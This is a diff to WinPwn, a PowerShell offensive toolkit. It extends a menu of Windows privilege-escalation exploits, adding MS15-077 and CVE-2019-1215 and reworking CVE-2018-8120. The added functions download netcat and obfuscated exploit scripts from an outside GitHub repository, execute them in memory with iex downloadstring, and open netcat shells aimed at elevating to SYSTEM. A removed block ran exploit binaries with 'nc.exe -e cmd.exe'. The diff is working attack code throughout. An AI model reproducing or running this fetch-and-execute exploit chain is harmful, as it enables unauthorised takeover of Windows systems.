@@ -544,29 +544,33 @@ __        ___       ____
     do
     {
         Write-Host "================ WinPwn ================"
-        Write-Host -ForegroundColor Green '1. MS16-032!'
-        Write-Host -ForegroundColor Green '2. MS16-135! '
-        Write-Host -ForegroundColor Green '3. CVE-2018-8120 - May 2018, Windows 7 SP1/2008 SP2,2008 R2 SP1! '
-        Write-Host -ForegroundColor Green '4. CVE-2019-0841 - April 2019!'
-        Write-Host -ForegroundColor Green '5. CVE-2019-1069 - Polarbear Hardlink, Credentials needed - June 2019! '
-        Write-Host -ForegroundColor Green '6. CVE-2019-1129/1130 - Race Condition, multiples cores needed - July 2019! '
-        Write-Host -ForegroundColor Green '7. Juicy-Potato Exploit from SeImpersonate or SeAssignPrimaryToken to SYSTEM!'
-        Write-Host -ForegroundColor Green '8. Exit. '
+ 	Write-Host -ForegroundColor Green '1. MS15-077 - (XP/Vista/Win7/Win8/2000/2003/2008/2012) x86 only!'
+ 	Write-Host -ForegroundColor Green '2. MS16-032 - (2008/7/8/10/2012)!'
+        Write-Host -ForegroundColor Green '3. MS16-135 - (2016)! '
+        Write-Host -ForegroundColor Green '4. CVE-2018-8120 - May 2018, Windows 7 SP1/2008 SP2,2008 R2 SP1! '
+        Write-Host -ForegroundColor Green '5. CVE-2019-0841 - April 2019!'
+        Write-Host -ForegroundColor Green '6. CVE-2019-1069 - Polarbear Hardlink, Credentials needed - June 2019! '
+        Write-Host -ForegroundColor Green '7. CVE-2019-1129/1130 - Race Condition, multiples cores needed - July 2019! '
+	Write-Host -ForegroundColor Green '8. CVE-2019-1215 - September 2019 - x64 only! '
+        Write-Host -ForegroundColor Green '9. Juicy-Potato Exploit from SeImpersonate or SeAssignPrimaryToken to SYSTEM!'
+        Write-Host -ForegroundColor Green '10. Exit. '
         Write-Host "================ WinPwn ================"
         $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
 
         Switch ($masterquestion) 
         {
-             1{ms16-32}
-             2{ms16-135}
-             3{CVE-2018-8120}
-             4{CVE-2019-0841}
-             5{cve-2019-1069}
-             6{CVE-2019-1129}
-             7{juicypot}
+	     1{ms15-077}
+             2{ms16-32}
+             3{ms16-135}
+             4{CVE-2018-8120}
+             5{CVE-2019-0841}
+             6{cve-2019-1069}
+             7{CVE-2019-1129}
+	     8{CVE-2019-1215}
+             9{juicypot}
        }
     }
- While ($masterquestion -ne 8)
+ While ($masterquestion -ne 10)
 
 }
 
@@ -578,6 +582,42 @@ function testtemp
  }
 }
 
+function CVE-2019-1215
+{
+    testtemp
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+    Invoke-Webrequest -Uri "https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/nc.exe" -Outfile C:\temp\nc.exe
+    if ([Environment]::Is64BitProcess)
+    {
+        iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/cve-2019-1215.ps1')
+    }
+    else
+    {
+        Write-Host "Only x64, Sorry"
+    }
+
+}
+
+function ms15-077
+{
+    testtemp
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+    Invoke-Webrequest -Uri "https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/nc.exe" -Outfile C:\temp\nc.exe
+    if ([Environment]::Is64BitProcess)
+    {
+        Write-Host "Only x86, Sorry"
+	Start-Sleep -Seconds 3
+    }
+    else
+    {
+        iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/m15-077.ps1')
+	MS15-077 -command "C:\temp\nc.exe 127.0.0.1 4444"
+	Start-Sleep -Seconds 3
+	cmd /c start powershell -Command {C:\temp\nc.exe 127.0.0.1 4444}
+    }
+    
+
+}
 function juicypot
 {
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
@@ -602,16 +642,9 @@ function CVE-2018-8120
     testtemp
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
     Invoke-Webrequest -Uri "https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/nc.exe" -Outfile C:\temp\nc.exe
-    if ([Environment]::Is64BitProcess)
-    {
-        Invoke-Webrequest -Uri "https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/2018-8120.exe" -Outfile C:\temp\exp.exe
-    }
-    else
-    {
-        Invoke-Webrequest -Uri "https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/2018-8120x86.exe" -Outfile C:\temp\exp.exe
-    }
-    C:\temp\exp.exe "C:\temp\nc.exe 127.0.0.1 4444 -e cmd.exe"
-    Start-Sleep -Seconds 4
+    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/cve-2018-8120.ps1')
+    cve-2018-8120 -command "C:\temp\nc.exe 127.0.0.1 4444"
+    Start-Sleep -Seconds 3
     cmd /c start powershell -Command {C:\temp\nc.exe 127.0.0.1 4444}
 }
 
